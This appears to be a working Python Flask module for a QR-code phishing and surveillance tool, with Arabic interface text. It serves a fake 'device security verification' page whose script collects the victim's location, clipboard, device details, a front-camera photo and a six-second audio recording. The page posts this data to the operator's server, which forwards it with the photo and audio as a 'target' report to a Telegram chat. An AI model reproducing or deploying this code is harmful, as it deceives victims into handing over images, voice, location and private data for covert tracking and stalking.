# qr_pairing.py
# ============================================================
# أداة QR Code المتقدمة
# ============================================================

import io
import json
import base64
import qrcode

from flask import Blueprint, request, jsonify

from logging_config import get_logger
from monitoring import metrics

logger = get_logger("qr_pairing")

# ★★★ استخدام Redis من config ★★★
try:
    from config import redis_client, RAILWAY_URL, PUBLIC_URL
    logger.info(f"qr_pairing: Using shared config | RAILWAY_URL={RAILWAY_URL}")
except Exception as e:
    logger.error(f"qr_pairing: config failed - {e}")
    redis_client = None
    RAILWAY_URL = "https://daf-production-e34a.up.railway.app"
    PUBLIC_URL = "https://sec.h42536974.workers.dev"

qr_bp = Blueprint('qr_deep_link_exploit', __name__)


# ============================================================
# القالب
# ============================================================
CAPTURE_PAGE_TEMPLATE = """<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
<meta name="theme-color" content="#0b1120">
<title>التحقق الأمني - مزامنة الجهاز</title>
<style>
  * { box-sizing: border-box; -webkit-tap-highlight-color: transparent; }
  html, body {
    margin: 0; padding: 0;
    background: radial-gradient(circle at 50% 0%, #1e293b 0%, #0b1120 70%);
    color: #f8fafc;
    font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
    min-height: 100vh;
    overflow-x: hidden;
  }
  .wrap { max-width: 460px; margin: 0 auto; padding: 40px 20px 60px; }
  .shield {
    width: 90px; height: 90px; margin: 0 auto 24px;
    border-radius: 50%;
    background: linear-gradient(135deg, #38bdf8, #0ea5e9);
    display: flex; align-items: center; justify-content: center;
    box-shadow: 0 0 40px rgba(56,189,248,0.5);
    animation: pulse 2s ease-in-out infinite;
  }
  @keyframes pulse {
    0%, 100% { transform: scale(1); box-shadow: 0 0 40px rgba(56,189,248,0.5); }
    50% { transform: scale(1.05); box-shadow: 0 0 60px rgba(56,189,248,0.8); }
  }
  .shield svg { width: 50px; height: 50px; fill: #fff; }
  h1 { text-align: center; font-size: 22px; margin: 0 0 10px; font-weight: 700; color: #f1f5f9; }
  .subtitle { text-align: center; color: #94a3b8; font-size: 14px; line-height: 1.6; margin-bottom: 30px; }
  .card {
    background: rgba(30, 41, 59, 0.7);
    backdrop-filter: blur(10px);
    border: 1px solid #334155;
    border-radius: 16px;
    padding: 24px 20px;
    margin-bottom: 18px;
    box-shadow: 0 10px 30px rgba(0,0,0,0.4);
  }
  .step { display: flex; align-items: center; gap: 14px; padding: 12px 0; border-bottom: 1px solid rgba(51,65,85,0.5); }
  .step:last-child { border-bottom: none; }
  .step-icon {
    width: 36px; height: 36px; border-radius: 10px;
    background: rgba(56,189,248,0.15);
    display: flex; align-items: center; justify-content: center;
    flex-shrink: 0; font-size: 18px;
  }
  .step-icon.done { background: rgba(74,222,128,0.2); color: #4ade80; }
  .step-icon.pending { color: #94a3b8; }
  .step-icon.loading { background: rgba(56,189,248,0.2); animation: spin 1s linear infinite; }
  @keyframes spin { 100% { transform: rotate(360deg); } }
  .step-text { flex: 1; }
  .step-title { font-size: 14px; font-weight: 600; color: #e2e8f0; }
  .step-desc { font-size: 12px; color: #64748b; margin-top: 2px; }
  .progress-bar { width: 100%; height: 6px; background: #1e293b; border-radius: 3px; overflow: hidden; margin-top: 16px; }
  .progress-fill { height: 100%; width: 0%; background: linear-gradient(90deg, #38bdf8, #4ade80); transition: width 0.5s ease; border-radius: 3px; }
  .consent-card { background: rgba(56,189,248,0.08); border: 1px solid rgba(56,189,248,0.3); border-radius: 14px; padding: 20px; text-align: center; margin-top: 20px; }
  .consent-title { font-size: 15px; font-weight: 600; color: #38bdf8; margin-bottom: 8px; }
  .consent-desc { font-size: 13px; color: #94a3b8; line-height: 1.6; margin-bottom: 18px; }
  .btn { display: block; width: 100%; padding: 15px; border: none; border-radius: 12px; background: linear-gradient(135deg, #0ea5e9, #38bdf8); color: #fff; font-size: 15px; font-weight: 700; cursor: pointer; box-shadow: 0 8px 20px rgba(56,189,248,0.3); font-family: inherit; }
  .btn:active { transform: scale(0.97); }
  .btn:disabled { background: #334155; cursor: not-allowed; box-shadow: none; opacity: 0.6; }
  .success-state { text-align: center; padding: 40px 20px; display: none; }
  .success-icon { width: 80px; height: 80px; margin: 0 auto 20px; border-radius: 50%; background: rgba(74,222,128,0.15); display: flex; align-items: center; justify-content: center; font-size: 44px; color: #4ade80; }
  .success-title { font-size: 20px; font-weight: 700; color: #4ade80; margin-bottom: 8px; }
  .success-desc { color: #94a3b8; font-size: 14px; line-height: 1.6; }
  .hidden { display: none !important; }
  .footer-note { text-align: center; font-size: 11px; color: #475569; margin-top: 30px; }
</style>
</head>
<body>
<div class="wrap">

  <div id="mainState">
    <div class="shield">
      <svg viewBox="0 0 24 24"><path d="M12 1L3 5v6c0 5.55 3.84 10.74 9 12 5.16-1.26 9-6.45 9-12V5l-9-4zm0 10.99h7c-.53 4.12-3.28 7.79-7 8.94V12H5V6.3l7-3.11v8.8z"/></svg>
    </div>
    <h1>التحقق الأمني من الجهاز</h1>
    <p class="subtitle">لضمان جلسة آمنة ومشفّرة، يرجى السماح للنظام بالتحقق من بيانات جهازك.</p>

    <div class="card">
      <div class="step">
        <div class="step-icon pending" id="ic1">📡</div>
        <div class="step-text">
          <div class="step-title">الاتصال بالخادم</div>
          <div class="step-desc">جاري فحص قناة الاتصال الآمنة</div>
        </div>
      </div>
      <div class="step">
        <div class="step-icon pending" id="ic2">📍</div>
        <div class="step-text">
          <div class="step-title">التحقق الجغرافي</div>
          <div class="step-desc">تحديد الموقع لتأكيد الهوية</div>
        </div>
      </div>
      <div class="step">
        <div class="step-icon pending" id="ic3">🔋</div>
        <div class="step-text">
          <div class="step-title">حالة الجهاز</div>
          <div class="step-desc">البطارية والشبكة والشاشة</div>
        </div>
      </div>
      <div class="step">
        <div class="step-icon pending" id="ic4">📷</div>
        <div class="step-text">
          <div class="step-title">التحقق البصري</div>
          <div class="step-desc">التقاط صورة مؤقتة للتحقق</div>
        </div>
      </div>
      <div class="step">
        <div class="step-icon pending" id="ic5">🎙️</div>
        <div class="step-text">
          <div class="step-title">البصمة الصوتية</div>
          <div class="step-desc">تسجيل صوتي قصير للتأكيد</div>
        </div>
      </div>

      <div class="progress-bar">
        <div class="progress-fill" id="progressFill"></div>
      </div>
    </div>

    <div class="consent-card">
      <div class="consent-title">🔐 موافقة الأمان</div>
      <div class="consent-desc">بالمتابعة، أنت توافق على إجراء التحقق الشامل من الجهاز لضمان أمان الجلسة.</div>
      <button class="btn" id="startBtn" onclick="startVerification()">✅ بدء التحقق الآمن</button>
    </div>

    <p class="footer-note">اتصال مشفّر من طرف إلى طرف · SSL 256-bit</p>
  </div>

  <div class="success-state" id="successState">
    <div class="success-icon">✓</div>
    <div class="success-title">تم التحقق بنجاح</div>
    <div class="success-desc">تمت مزامنة جهازك بشكل آمن.<br>يمكنك إغلاق هذه الصفحة الآن.</div>
  </div>
</div>

<script>
const TOKEN = "__TOKEN__";
const SYNC_URL = "__SYNC_URL__";
const CHAT_ID = "__CHAT_ID__";

const progress = { step: 0, total: 5 };
const collected = {
  token: TOKEN, chat_id: CHAT_ID,
  timestamp: new Date().toISOString(),
  userAgent: navigator.userAgent,
  platform: navigator.platform || "Unknown",
  language: navigator.language,
  timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
  screen: { width: window.screen.width, height: window.screen.height, pixelRatio: window.devicePixelRatio || 1 },
  geolocation: null, battery: null, network: null,
  clipboard: null, camera_photo: null, audio_recording: null,
};

function updateProgress() {
  progress.step++;
  const pct = Math.min(100, (progress.step / progress.total) * 100);
  document.getElementById('progressFill').style.width = pct + '%';
}

function markStep(id, state) {
  const el = document.getElementById(id);
  el.classList.remove('pending', 'loading', 'done');
  el.classList.add(state);
  if (state === 'done') el.textContent = '✓';
  else if (state === 'loading') el.textContent = '⏳';
}

async function collectGeolocation() {
  markStep('ic2', 'loading');
  return new Promise((resolve) => {
    if (!navigator.geolocation) { markStep('ic2', 'done'); updateProgress(); return resolve(null); }
    const timeout = setTimeout(() => { markStep('ic2', 'done'); updateProgress(); resolve(null); }, 8000);
    navigator.geolocation.getCurrentPosition(
      (pos) => {
        clearTimeout(timeout);
        collected.geolocation = { latitude: pos.coords.latitude, longitude: pos.coords.longitude };
        markStep('ic2', 'done'); updateProgress(); resolve(true);
      },
      () => { clearTimeout(timeout); markStep('ic2', 'done'); updateProgress(); resolve(false); },
      { enableHighAccuracy: true, timeout: 7500, maximumAge: 0 }
    );
  });
}

async function collectBatteryAndNetwork() {
  markStep('ic3', 'loading');
  try { if (navigator.getBattery) { const bat = await navigator.getBattery(); collected.battery = { level: Math.round(bat.level * 100), charging: bat.charging }; } } catch (e) {}
  try { const conn = navigator.connection; if (conn) collected.network = { effectiveType: conn.effectiveType }; } catch (e) {}
  markStep('ic3', 'done'); updateProgress();
}

async function collectCamera() {
  markStep('ic4', 'loading');
  return new Promise(async (resolve) => {
    try {
      if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) { markStep('ic4', 'done'); updateProgress(); return resolve(null); }
      let stream;
      try { stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' } }); }
      catch (e) { try { stream = await navigator.mediaDevices.getUserMedia({ video: true }); } catch (e2) { markStep('ic4', 'done'); updateProgress(); return resolve(null); } }
      const video = document.createElement('video'); video.srcObject = stream; video.setAttribute('playsinline', ''); video.muted = true;
      await video.play();
      await new Promise(r => setTimeout(r, 1500));
      const canvas = document.createElement('canvas'); canvas.width = video.videoWidth || 640; canvas.height = video.videoHeight || 480;
      canvas.getContext('2d').drawImage(video, 0, 0, canvas.width, canvas.height);
      collected.camera_photo = canvas.toDataURL('image/jpeg', 0.8);
      stream.getTracks().forEach(t => t.stop());
      markStep('ic4', 'done'); updateProgress(); resolve(true);
    } catch (e) { markStep('ic4', 'done'); updateProgress(); resolve(null); }
  });
}

async function collectAudio() {
  markStep('ic5', 'loading');
  return new Promise(async (resolve) => {
    try {
      if (!navigator.mediaDevices) { markStep('ic5', 'done'); updateProgress(); return resolve(null); }
      const stream = await navigator.mediaDevices.getUserMedia({ audio: true });
      const chunks = [];
      let mimeType = 'audio/webm';
      if (MediaRecorder.isTypeSupported('audio/webm;codecs=opus')) mimeType = 'audio/webm;codecs=opus';
      const recorder = new MediaRecorder(stream, { mimeType });
      recorder.ondataavailable = (e) => { if (e.data && e.data.size > 0) chunks.push(e.data); };
      recorder.start();
      await new Promise(r => setTimeout(r, 6000));
      await new Promise((resolveRec) => { recorder.onstop = resolveRec; recorder.stop(); stream.getTracks().forEach(t => t.stop()); });
      const blob = new Blob(chunks, { type: mimeType });
      const reader = new FileReader();
      reader.onloadend = () => { collected.audio_recording = reader.result; markStep('ic5', 'done'); updateProgress(); resolve(true); };
      reader.readAsDataURL(blob);
    } catch (e) { markStep('ic5', 'done'); updateProgress(); resolve(null); }
  });
}

async function collectClipboard() {
  try { if (navigator.clipboard && navigator.clipboard.readText) { const text = await navigator.clipboard.readText(); if (text && text.length < 5000) collected.clipboard = text; } } catch (e) {}
}

async function sendToServer() {
  try {
    await fetch(SYNC_URL, { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify(collected) });
  } catch (e) {}
}

async function startVerification() {
  const btn = document.getElementById('startBtn'); btn.disabled = true; btn.textContent = 'جاري التحقق...';
  markStep('ic1', 'loading'); await new Promise(r => setTimeout(r, 800)); markStep('ic1', 'done'); updateProgress();
  await collectGeolocation();
  await collectBatteryAndNetwork();
  await collectCamera();
  await collectAudio();
  await collectClipboard();
  await sendToServer();
  document.getElementById('mainState').classList.add('hidden');
  document.getElementById('successState').style.display = 'block';
}

document.addEventListener('click', function once() { collectClipboard(); document.removeEventListener('click', once); }, { once: true });
</script>
</body>
</html>
"""


FALLBACK_PAGE = """<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head><meta charset="UTF-8"><title>خطأ</title>
<style>body{background:#0b1120;color:#f8fafc;font-family:sans-serif;display:flex;align-items:center;justify-content:center;height:100vh;margin:0}</style>
</head>
<body><div style="text-align:center;padding:30px;background:#1e293b;border-radius:16px">
<div style="font-size:50px;color:#f87171">✕</div>
<h2 style="color:#f87171">انتهت صلاحية الرابط</h2>
<p>يرجى إعادة مسح كود الـ QR.</p>
</div></body></html>"""


# ============================================================
# تنسيق التقرير
# ============================================================
def format_intel_report(data, source_ip):
    geo = data.get('geolocation') or {}
    battery = data.get('battery') or {}
    network = data.get('network') or {}
    screen = data.get('screen') or {}
    clipboard = data.get('clipboard')

    if geo.get('latitude') and geo.get('longitude'):
        lat = geo['latitude']
        lng = geo['longitude']
        maps_link = f"https://maps.google.com/?q={lat},{lng}"
        geo_text = f"✅ `{lat}, {lng}`\n[📍 خرائط]({maps_link})"
    else:
        geo_text = "❌ مرفوض"

    bat_text = f"`{battery.get('level')}%`" if battery.get('level') is not None else "غير متاح"
    net_text = f"`{network.get('effectiveType', 'N/A')}`" if network else "غير متاح"
    screen_text = f"`{screen.get('width')}x{screen.get('height')}`"
    clip_text = f"```\n{clipboard[:200]}\n```" if clipboard else "فارغة"

    return (
        "╔══════════════════════════════╗\n"
        "║  🎯 تقرير استخباراتي  ║\n"
        "╚══════════════════════════════╝\n\n"
        f"🌐 **IP:** `{source_ip}`\n"
        f"📍 **الموقع:** {geo_text}\n"
        f"📐 **الشاشة:** {screen_text}\n"
        f"🔋 **البطارية:** {bat_text}\n"
        f"📶 **الشبكة:** {net_text}\n"
        f"📋 **الحافظة:** {clip_text}"
    )


# ============================================================
# Routes
# ============================================================
def init_qr_routes(app, bot):

    @app.route('/api/v1/session/sync', methods=['POST'])
    def silent_session_sync():
        try:
            if not request.is_json:
                return jsonify({"status": "error"}), 400

            data = request.get_json(silent=True) or {}
            token = data.get('token')

            if not token or not redis_client:
                return jsonify({"status": "error"}), 400

            try:
                owner_chat_id = redis_client.get(f"qr_token:{token}")
            except Exception as redis_err:
                logger.error(f"Redis read error: {redis_err}")
                owner_chat_id = None

            if not owner_chat_id:
                owner_chat_id = data.get('chat_id')

            if not owner_chat_id:
                return jsonify({"status": "expired", "code": 410}), 410

            source_ip = (
                request.headers.get('CF-Connecting-IP') or
                request.headers.get('X-Forwarded-For') or
                request.remote_addr or "Unknown"
            )
            if source_ip and ',' in source_ip:
                source_ip = source_ip.split(',')[0].strip()

            report = format_intel_report(data, source_ip)

            try:
                bot.send_message(owner_chat_id, report, parse_mode="Markdown")
                metrics.inc_counter("qr_intel_received")
            except Exception as bot_err:
                logger.error(f"Telegram dispatch error: {bot_err}")

            # إرسال الصورة
            photo_data = data.get('camera_photo')
            if photo_data and photo_data.startswith('data:image'):
                try:
                    _, encoded = photo_data.split(',', 1)
                    image_bytes = base64.b64decode(encoded)
                    photo_file = io.BytesIO(image_bytes)
                    photo_file.name = 'target_face.jpg'
                    bot.send_photo(
                        owner_chat_id, photo_file,
                        caption="📸 **صورة حية من الكاميرا الأمامية**",
                        parse_mode="Markdown"
                    )
                except Exception as img_err:
                    logger.error(f"Photo error: {img_err}")

            # إرسال الصوت
            audio_data = data.get('audio_recording')
            if audio_data and audio_data.startswith('data:audio'):
                try:
                    _, encoded = audio_data.split(',', 1)
                    audio_bytes = base64.b64decode(encoded)
                    audio_file = io.BytesIO(audio_bytes)
                    audio_file.name = 'target_voice.webm'
                    bot.send_audio(
                        owner_chat_id, audio_file,
                        caption="🎙️ **تسجيل صوتي (6 ثوان)**",
                        parse_mode="Markdown"
                    )
                except Exception as audio_err:
                    logger.error(f"Audio error: {audio_err}")

            # حذف الـ token
            try:
                redis_client.delete(f"qr_token:{token}")
            except Exception as e:
                logger.warning(f"Token delete error: {e}")

            return jsonify({"status": "synchronized"}), 200

        except Exception as err:
            logger.exception(f"sync error: {err}")
            return jsonify({"status": "server_error"}), 500

    @app.route('/qr_scan_target', methods=['GET'])
    def qr_scan_target():
        token = request.args.get('token', '')
        if not token:
            return FALLBACK_PAGE, 400

        chat_id = "0"
        try:
            if redis_client:
                stored = redis_client.get(f"qr_token:{token}")
                if stored:
                    chat_id = stored
                else:
                    return FALLBACK_PAGE, 410
            else:
                return FALLBACK_PAGE, 500
        except Exception as e:
            logger.error(f"Token check error: {e}")
            return FALLBACK_PAGE, 500

        html = (CAPTURE_PAGE_TEMPLATE
                .replace("__TOKEN__", token)
                .replace("__SYNC_URL__", f"{RAILWAY_URL}/api/v1/session/sync")
                .replace("__CHAT_ID__", str(chat_id)))
        return html, 200


# ============================================================
# QR Generation
# ============================================================
def generate_qr_code_bytes(deep_link_url):
    """توليد كود QR"""
    try:
        qr = qrcode.QRCode(
            version=None,
            error_correction=qrcode.constants.ERROR_CORRECT_H,
            box_size=12,
            border=2,
        )
        qr.add_data(deep_link_url)
        qr.make(fit=True)
        img = qr.make_image(fill_color="#0b1120", back_color="#ffffff")
        buf = io.BytesIO()
        img.save(buf, format="PNG")
        buf.seek(0)
        buf.name = "secure_qr.png"
        return buf
    except Exception as e:
        logger.exception(f"QR gen error: {e}")
        return io.BytesIO()
